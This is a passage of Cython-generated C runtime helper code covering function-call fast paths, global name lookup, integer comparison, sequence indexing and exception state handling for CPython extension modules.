                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* PyIntCompare */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_TRUE;
    }
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a == b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        } else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_FALSE;
            intval = -intval;
            size = -size;
        } else {
            if (size <= 0)
                Py_RETURN_FALSE;
        }
        uintval = (unsigned long) intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 3)) {
            unequal = (size != 4) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 2)) {
            unequal = (size != 3) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 1)) {
            unequal = (size != 2) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
            unequal = (size != 1) || (((unsigned long) digits[0]) != (uintval & (unsigned long) PyLong_MASK));
        if (unequal == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a == (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_EQ));
}

/* DictGetItem */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

/* PyUnicode_Unicode */
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_Unicode(PyObject *obj) {
    if (unlikely(obj == Py_None))
        obj = __pyx_kp_u_None;
    return __Pyx_NewRef(obj);
}

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* RaiseTooManyValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}

/* RaiseNeedMoreValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}

/* IterFinish */
static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
